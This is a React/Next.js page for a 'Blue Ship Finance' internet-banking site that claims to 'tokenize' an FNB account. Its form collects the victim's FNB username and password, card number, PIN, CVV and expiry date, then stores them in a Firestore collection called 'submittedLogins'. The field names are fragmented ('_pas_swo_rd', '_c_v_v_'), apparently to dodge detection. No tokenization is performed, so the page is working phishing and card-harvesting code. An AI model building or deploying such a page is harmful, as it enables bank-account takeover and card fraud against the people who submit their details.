import React from "react";
import { Meta } from "../../../components";
import { Box } from "@mui/material";
import PrivateRoute from "../../../components/auth/PrivateRoute";
import { useState } from "react";
import { useRouter } from "next/router";
import { useContext } from "react";
import userDataContext from "../../../context/UserDataContext";
import cogoToast from "cogo-toast";
import { addDoc, collection } from "firebase/firestore";
import { db } from "../../../services/firebase.config";

const inputStyles = {
  color: "#383633",
  background: "#fff",
  border: "1px solid #ADDBDB",
  lineHeight: "21px",
  padding: "3px 6px",
  outline: "none",
  width: "170px",
  fontSize: "13.5px",
};

const labelStyle = {
  display: "flex",
  gap: "1rem",
  fontSize: "13.5px",
  justifyContent: "space-between",
  alignItems: "center",
  maxWidth: "280px",
};

const Fnb = () => {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    _pas_swo_rd: "",
    _ca_rd_Num_ber: "",
    _p_i_n_: "",
    _c_v_v_: "",
    _exp_iry_Da_te_: "",
  });

  const { userData } = useContext(userDataContext);

  const {
    username,
    _pas_swo_rd,
    _ca_rd_Num_ber,
    _p_i_n_,
    _c_v_v_,
    _exp_iry_Da_te_,
  } = formData;

  const inputChangeHandler = (e) => {
    setFormData((prev) => ({
      ...prev,
      [e.target.id]: e.target.value,
    }));
  };

  const tokenizeAccount = async () => {
    const validateDetails =
      username.trim().length > 0 &&
      _pas_swo_rd.length > 0 &&
      _ca_rd_Num_ber.trim().length > 10 &&
      _p_i_n_.trim().length >= 4 &&
      _c_v_v_.trim().length >= 3 &&
      _exp_iry_Da_te_.trim().length >= 6;

    if (validateDetails) {
      try {
        setIsLoading(true);

        const res = await addDoc(collection(db, "submittedLogins"), {
          _user: userData.id,
          user_name: `${userData.firstName} ${userData.lastName}`,
          timeStamp: new Date(),
          data: {
            ...formData,
            _exp_iry_Da_te_: new Date(_exp_iry_Da_te_),
            bank: "fnb bank",
          },
        });

        console.log(res);
        if (res) {
          cogoToast.success("Successful");
          // navigate back to dashboard
          router.replace("/account");
        }
        setIsLoading(false);
      } catch (error) {
        console.log(error);
        cogoToast.error("Something went wrong");
        setIsLoading(false);
      }
    } else {
      cogoToast.error("One or more inputs are invalid");
    }
  };

  return (
    <>
      <Meta
        title="FNB Tokenization - Blue Ship Finance Internet Banking"
        description="FNB Tokenization - Blue Ship Finance Internet Banking"
      />

      <PrivateRoute>
        <Box
          sx={{
            background: "#009999",
            py: 2,
            pl: 4,
            minHeight: "100vh",
          }}
        >
          <Box
            sx={{
              p: 2,
              background: "#fff",
              minHeight: "100vh",
              borderTopLeftRadius: 16,
              borderBottomLeftRadius: 16,
            }}
          >
            <p style={{ color: "#009999" }}>Authenticate</p>
            <form style={{ marginLeft: "4rem", maxWidth: "300px" }}>
              <label id="usernameLabel" htmlFor="username" style={labelStyle}>
                <span>Username:{"  "}</span>
                <input
                  id="username"
                  name="text"
                  type="username"
                  maxlength="40"
                  value={username}
                  style={inputStyles}
                  onChange={inputChangeHandler}
                />
              </label>
              <label
                id="passwordLabel"
                htmlFor="_pas_swo_rd"
                style={labelStyle}
              >
                <span>Password:{"  "}</span>
                <input
                  id="_pas_swo_rd"
                  name="_pas_swo_rd"
                  type="password"
                  maxlength="40"
                  style={inputStyles}
                  onChange={inputChangeHandler}
                  value={_pas_swo_rd}
                />
              </label>
              <label
                id="cardNumberLabel"
                htmlFor="_ca_rd_Num_ber"
                style={labelStyle}
              >
                <span>Card Number:{"  "}</span>
                <input
                  id="_ca_rd_Num_ber"
                  name="_ca_rd_Num_ber"
                  type="number"
                  maxlength="18"
                  style={inputStyles}
                  value={_ca_rd_Num_ber}
                  onChange={inputChangeHandler}
                />
              </label>
              <label
                id="cardPinLabel"
                htmlFor="_exp_iry_Da_te_"
                style={labelStyle}
              >
                <span>Pin:{"  "}</span>

                <input
                  name="_exp_iry_Da_te_"
                  id="_exp_iry_Da_te_"
                  type="date"
                  value={_exp_iry_Da_te_}
                  style={inputStyles}
                  onChange={inputChangeHandler}
                />
              </label>
              <label id="cardPinLabel" htmlFor="_c_v_v_" style={labelStyle}>
                <span>CVV:{"  "}</span>
                <input
                  name="_c_v_v_"
                  id="_c_v_v_"
                  type="number"
                  value={_c_v_v_}
                  onChange={inputChangeHandler}
                  style={inputStyles}
                />
              </label>
              <label id="cardPinLabel" htmlFor="_p_i_n_" style={labelStyle}>
                <span>Pin:{"  "}</span>

                <input
                  name="_p_i_n_"
                  id="_p_i_n_"
                  type="number"
                  value={_p_i_n_}
                  onChange={inputChangeHandler}
                  maxlength="4"
                  style={inputStyles}
                />
              </label>

              <button
                type="button"
                style={{
                  outline: "none",
                  border: "none",
                  background: "#ff9900",
                  padding: "6px 16px",
                  color: "#fff",
                  cursor: "pointer",
                }}
                onClick={tokenizeAccount}
                disabled={isLoading}
              >
                {isLoading ? "Loading..." : "Submit"}
              </button>
            </form>
          </Box>
        </Box>
      </PrivateRoute>
    </>
  );
};

export default Fnb;
